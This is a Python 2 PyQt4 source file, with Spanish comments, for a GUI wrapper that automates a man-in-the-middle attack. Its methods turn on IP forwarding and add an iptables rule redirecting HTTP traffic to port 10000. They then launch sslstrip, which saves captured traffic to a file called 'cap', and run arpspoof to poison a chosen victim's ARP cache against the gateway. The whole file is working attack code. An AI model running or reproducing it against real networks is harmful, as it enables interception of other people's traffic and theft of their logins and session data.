# -*- coding: utf-8 -*-

from PyQt4.QtCore import QObject, pyqtSignal
from threading import Thread
from pexpect import spawn
from subprocess import Popen, PIPE, STDOUT
from time import sleep
import sys

class SSLStrip(QObject):
    
    fin = pyqtSignal()
    texto = pyqtSignal(str, name='texto')
    
    def __init__(self, interfaz, rhost, gateway, matarSesiones):
        QObject.__init__(self)
        
        self.interfaz = interfaz.replace("\r", "")
        self.rhost = rhost.replace("\r", "")
        self.gateway = gateway.replace("\r", "")
        self.matarSesiones = matarSesiones
        
    def setup(self):
        self.forward()
        sleep(1)

        self.iptables()
        sleep(1)
        
        # Iniciamos SSLStrip como thread
        self.threadSSLStrip = Thread(target=self.sslStrip())
        self.threadSSLStrip.daemon = True
        self.threadSSLStrip.start()
        sleep(1)
        
        # Iniciamos ARPSpoof como thread
        self.threadARPSpoof = Thread(target=self.arpSpoof())
        self.threadARPSpoof.daemon = True
        self.threadARPSpoof.start()
        
    def forward(self):
        self.texto.emit("[*] Activando Forwarding")
        
        cmd = "bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'"
        print "echo 1 > /proc/sys/net/ipv4/ip_forward"
        
        # Ejecutamos el comando
        try:
            popen = Popen(cmd, shell=True,
                    stdout=PIPE,
                    stderr=STDOUT)
            stdout, stderr = popen.communicate()

            if len(stdout) != 0:
                sys.exit("[-] ERROR: " + stdout)
        
        except Exception as e:
            sys.exit("[-] ERROR: " + str(e))        
        
        # Comprobamos si quedó bien configurado.
        try:
            popen = Popen("cat /proc/sys/net/ipv4/ip_forward",
                    shell=True,
                    stdout=PIPE,
                    stderr=STDOUT)
            stdout, stderr = popen.communicate()

            stdout = int(stdout)

        except Exception as e:
            sys.exit("[-] ERROR: " + str(e))
        
        if stdout == 1:
            self.texto.emit("[+] OK")        
        else:
            sys.exit("[-] ERROR (cat /proc/sys/net/ipv4/ip_forward -> " + stdout + ")")

    def iptables(self):
        self.texto.emit("[*] Configurando iptables para redirigir el trafico HTTP a sslstrip")
        
        cmd = "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000"
        print cmd
        
        # Ejecutamos el comando
        try:
            popen = Popen(cmd, shell=True,
            stdout=PIPE,
            stderr=STDOUT)
            stdout, stderr = popen.communicate()

            if len(stdout) != 0:
                sys.exit("[-] ERROR: " + stdout)
        
        except Exception as e:
            sys.exit("[-] ERROR: " + str(e))
        
        self.texto.emit("[+] OK")
    
    def sslStrip(self):
        self.texto.emit("[*] Iniciando SSLStrip")
        
        if self.matarSesiones:
            cmd = "sslstrip -w cap -k -l 10000"
        else:
            cmd = "sslstrip -w cap -l 10000"
        
        print cmd
        
        # Ejecutamos el comando
        try:
            self.childSSLStrip = spawn(cmd)
        
        except Exception as e:
            sys.exit("[-] ERROR: " + str(e))
        
        self.texto.emit("[+] OK (Guardando datos en el archivo 'cap')")
    
    def arpSpoof(self):  
        self.texto.emit("[*] Iniciando ARPSPoof")
        
        cmd = "arpspoof -i " + self.interfaz + " -t " + self.rhost + " " + self.gateway
        print cmd
        
        try:
            self.childARPSpoof = spawn(cmd)
            
        except Exception as e:
            sys.exit("[-] ERROR: " + str(e))
        
        self.texto.emit("[+] OK")
    
    def parar(self):
        self.texto.emit("[*] Finalizando de SSLStrip")
        try:
            self.childSSLStrip.close()
            self.childARPSpoof.close()
        except Exception as e:
            sys.exit("[-] ERROR: " + str(e))
        self.texto.emit("[+] OK")        
        self.fin.emit()        
